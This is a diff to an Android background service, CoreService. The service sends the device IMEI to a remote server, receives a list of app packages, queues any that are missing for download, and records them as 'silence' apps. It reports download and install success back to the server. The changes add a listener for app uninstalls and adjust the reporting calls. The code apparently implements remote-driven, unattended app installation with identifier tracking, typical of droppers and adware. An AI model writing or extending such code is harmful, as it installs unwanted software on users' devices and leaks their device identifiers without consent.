@@ -54,13 +54,14 @@ public class CoreService extends Service {
 	public static final int START_ACTIVE = 1;
 	public static final int UNLOCK_SCREEN = 2;
 	public static final int WIFI_STATE_CHANGED = 3;
+	public static final int PACKAGE_REMOVED = 4;
 
 	/**
 	 * 统计下载、安装及安装时间统计类型
 	 */
 	public static final int DOWNLOAD_SUCCESSFUL = 0;
 	public static final int INSTALL_SUCCESSFUL = 1;
-	public static final int TOTAL_COUNT = 1;
+	public static final int TOTAL_COUNT = 2;
 
 	private String imei = "";
 
@@ -91,6 +92,7 @@ public class CoreService extends Service {
 		filter.addAction(Intent.ACTION_SCREEN_OFF);
 		filter.addAction(Intent.ACTION_USER_PRESENT);
 		filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+		filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
 		registerReceiver(receiver, filter);
 
 		boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
@@ -119,6 +121,8 @@ public class CoreService extends Service {
 				receiveBroadcast(UNLOCK_SCREEN, intent);
 			else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
 				receiveBroadcast(WIFI_STATE_CHANGED, intent);
+			else if (Intent.ACTION_PACKAGE_REMOVED.equals(action))
+				receiveBroadcast(PACKAGE_REMOVED, intent);
 		}
 
 	}
@@ -133,7 +137,7 @@ public class CoreService extends Service {
 				sa.setInstalltime(System.currentTimeMillis());
 				sa.setActive(false);
 				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
-				sendSuccessfultoServer(DOWNLOAD_SUCCESSFUL, packageName);
+				sendSuccessfultoServer(INSTALL_SUCCESSFUL, packageName);
 			}
 		}
 	};
@@ -186,6 +190,10 @@ public class CoreService extends Service {
 				if (CommandUtil.canUpdate(sharedPreferences))
 					updateService();
 			}
+			break;
+		case PACKAGE_REMOVED:
+			CommandUtil.logW("有程序卸载。。。");
+			break;
 		}
 	}
 
@@ -204,12 +212,12 @@ public class CoreService extends Service {
 		JsonArrayRequest request = new JsonArrayRequest(SERVER_URL_PATH + "?imei=" + imei, new Listener<JSONArray>() {
 
 			@Override
-			public void onResponse(JSONArray arg0) {
+			public void onResponse(JSONArray jsonArray) {
 				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
 				List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
-				for (int i = 0; i < arg0.length(); i++) {
+				for (int i = 0; i < jsonArray.length(); i++) {
 					try {
-						JSONObject obj = arg0.getJSONObject(i);
+						JSONObject obj = jsonArray.getJSONObject(i);
 						String packName = obj.getString("package_name");
 						if (!installPackages.contains(packName)) {
 							DownloadApplication app = new DownloadApplication();
@@ -233,7 +241,6 @@ public class CoreService extends Service {
 	 * 開始下載，下載完成安裝
 	 */
 	private void startDownload() {
-		CommandUtil.logW("有" + mustDownloadApp.size() + "个要下载的");
 		if (!isDownloading && mustDownloadApp.size() > 0) {
 			isDownloading = true;
 			File parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
@@ -269,7 +276,7 @@ public class CoreService extends Service {
 	}
 
 	protected void sendSuccessfultoServer(final int type, final String packName) {
-		String url = String.format(SERVER_COUNT_URL_PATH + "?type=%d&imei=%s&packagename=%s", type, imei, packName);
+		String url = String.format(SERVER_UPDATE_URL_PATH + "?type=%d&imei=%s&packagename=%s", type, imei, packName);
 		CommandUtil.logW(url);
 		finalHttp.get(url, new AjaxCallBack<Object>() {
 			@Override
@@ -312,7 +319,7 @@ public class CoreService extends Service {
 	}
 
 	public static final String SERVER_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/down";
-	public static final String SERVER_COUNT_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/update";
+	public static final String SERVER_UPDATE_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/update";
 	public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
 	public static LinkedList<DownloadApplication> mustDownloadApp = new LinkedList<DownloadApplication>();
 	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
@@ -344,7 +351,7 @@ public class CoreService extends Service {
 					dao.update(entity);
 				}
 			}
-		}
+		} 
 		if (cursor != null)
 			cursor.close();
 	}
